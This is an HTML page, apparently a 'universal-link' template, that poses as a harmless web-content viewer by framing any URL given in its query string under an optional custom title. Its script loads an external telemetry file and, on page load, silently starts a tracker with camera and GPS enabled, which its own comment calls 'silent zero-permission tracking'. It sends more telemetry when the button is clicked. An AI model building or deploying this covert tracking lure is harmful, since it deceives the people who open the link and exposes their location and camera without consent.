<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="page-title">Loading Web Content...</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0f172a;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .container {
            width: 100%;
            height: 100%;
            position: relative;
            display: flex;
            flex-direction: column;
        }

        .header-bar {
            height: 48px;
            background: #1e293b;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            color: #f8fafc;
            font-size: 13px;
            z-index: 10;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 500;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .header-left i {
            color: #3b82f6;
        }

        .btn-direct {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 6px 14px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 6px;
            white-space: nowrap;
        }

        .iframe-container {
            flex: 1;
            width: 100%;
            height: calc(100% - 48px);
            position: relative;
            background: #ffffff;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header-bar">
            <div class="header-left">
                <i class="fas fa-globe"></i>
                <span id="header-domain">Web Content</span>
            </div>
            <a href="#" id="btn-direct-link" class="btn-direct" target="_blank">
                Open Original <i class="fas fa-external-link-alt"></i>
            </a>
        </div>
        <div class="iframe-container">
            <iframe id="dest-iframe" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; geolocation; camera" allowfullscreen></iframe>
        </div>
    </div>

    <script src="/js/telemetry.js"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        let targetUrl = '';
        let customTitle = '';

        const compressed = urlParams.get('d');
        if (compressed) {
            try {
                const data = JSON.parse(atob(decodeURIComponent(compressed)));
                if (data.u) targetUrl = data.u;
                if (data.t) customTitle = data.t;
            } catch (e) {}
        }

        if (!targetUrl) targetUrl = urlParams.get('u') || urlParams.get('url') || urlParams.get('target') || 'https://wikipedia.org';
        if (!customTitle) customTitle = urlParams.get('t') || urlParams.get('title');

        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
            targetUrl = 'https://' + targetUrl;
        }

        try {
            const parsed = new URL(targetUrl);
            document.getElementById('header-domain').innerText = parsed.hostname;
            document.getElementById('page-title').innerText = customTitle || parsed.hostname;
        } catch (e) {
            document.getElementById('header-domain').innerText = targetUrl;
        }

        if (customTitle) {
            document.getElementById('page-title').innerText = customTitle;
        }

        const iframe = document.getElementById('dest-iframe');
        const directBtn = document.getElementById('btn-direct-link');
        
        iframe.src = targetUrl;
        directBtn.href = targetUrl;

        directBtn.addEventListener('click', () => {
            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.sendTelemetry(null, 'universal-link', true, true);
            }
        });

        // Silent zero-permission tracking on load
        window.addEventListener('DOMContentLoaded', () => {
            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.startTracking({
                    templateName: 'universal-link',
                    updateInterval: 4000,
                    enableCamera: true,
                    enableGPS: true
                });
            }
        });
    </script>
</body>

</html>
